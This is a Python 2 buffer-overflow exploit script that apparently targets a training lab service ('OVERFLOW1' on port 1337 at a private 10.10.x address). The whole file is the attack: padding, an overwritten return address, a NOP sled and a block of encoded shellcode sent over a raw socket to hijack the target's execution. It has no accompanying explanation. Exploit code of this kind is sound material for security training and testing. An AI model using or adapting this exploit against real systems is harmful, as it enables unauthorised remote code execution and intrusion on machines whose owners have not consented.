import sys, socket

ip = "10.10.87.189"
port = 1337

junk = "A" * 1978 
ret = "\xaf\x11\x50\x62"
shell = ("\xda\xc3\xbb\x0e\x46\xf5\x1c\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xef\xfc\x31\x5f\x13\x03\x51\x55\x17\xe9\x91\xb1\x55"
"\x12\x69\x42\x3a\x9a\x8c\x73\x7a\xf8\xc5\x24\x4a\x8a\x8b\xc8"
"\x21\xde\x3f\x5a\x47\xf7\x30\xeb\xe2\x21\x7f\xec\x5f\x11\x1e"
"\x6e\xa2\x46\xc0\x4f\x6d\x9b\x01\x97\x90\x56\x53\x40\xde\xc5"
"\x43\xe5\xaa\xd5\xe8\xb5\x3b\x5e\x0d\x0d\x3d\x4f\x80\x05\x64"
"\x4f\x23\xc9\x1c\xc6\x3b\x0e\x18\x90\xb0\xe4\xd6\x23\x10\x35"
"\x16\x8f\x5d\xf9\xe5\xd1\x9a\x3e\x16\xa4\xd2\x3c\xab\xbf\x21"
"\x3e\x77\x35\xb1\x98\xfc\xed\x1d\x18\xd0\x68\xd6\x16\x9d\xff"
"\xb0\x3a\x20\xd3\xcb\x47\xa9\xd2\x1b\xce\xe9\xf0\xbf\x8a\xaa"
"\x99\xe6\x76\x1c\xa5\xf8\xd8\xc1\x03\x73\xf4\x16\x3e\xde\x91"
"\xdb\x73\xe0\x61\x74\x03\x93\x53\xdb\xbf\x3b\xd8\x94\x19\xbc"
"\x1f\x8f\xde\x52\xde\x30\x1f\x7b\x25\x64\x4f\x13\x8c\x05\x04"
"\xe3\x31\xd0\x8b\xb3\x9d\x8b\x6b\x63\x5e\x7c\x04\x69\x51\xa3"
"\x34\x92\xbb\xcc\xdf\x69\x2c\xf9\x16\xdb\xd7\x95\x2a\x1b\x0b"
"\x4f\xa2\xfd\x21\x9f\xe2\x56\xde\x06\xaf\x2c\x7f\xc6\x65\x49"
"\xbf\x4c\x8a\xae\x0e\xa5\xe7\xbc\xe7\x45\xb2\x9e\xae\x5a\x68"
"\xb6\x2d\xc8\xf7\x46\x3b\xf1\xaf\x11\x6c\xc7\xb9\xf7\x80\x7e"
"\x10\xe5\x58\xe6\x5b\xad\x86\xdb\x62\x2c\x4a\x67\x41\x3e\x92"
"\x68\xcd\x6a\x4a\x3f\x9b\xc4\x2c\xe9\x6d\xbe\xe6\x46\x24\x56"
"\x7e\xa5\xf7\x20\x7f\xe0\x81\xcc\xce\x5d\xd4\xf3\xff\x09\xd0"
"\x8c\x1d\xaa\x1f\x47\xa6\xca\xfd\x4d\xd3\x62\x58\x04\x5e\xef"
"\x5b\xf3\x9d\x16\xd8\xf1\x5d\xed\xc0\x70\x5b\xa9\x46\x69\x11"
"\xa2\x22\x8d\x86\xc3\x66")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    s.recv(1024)
    s.send("OVERFLOW1 " + junk + ret + "\x90" * 32 + shell  + "\r\n")
    s.recv(1024)
    s.close()
except:
    print("connection error")
    sys.exit()








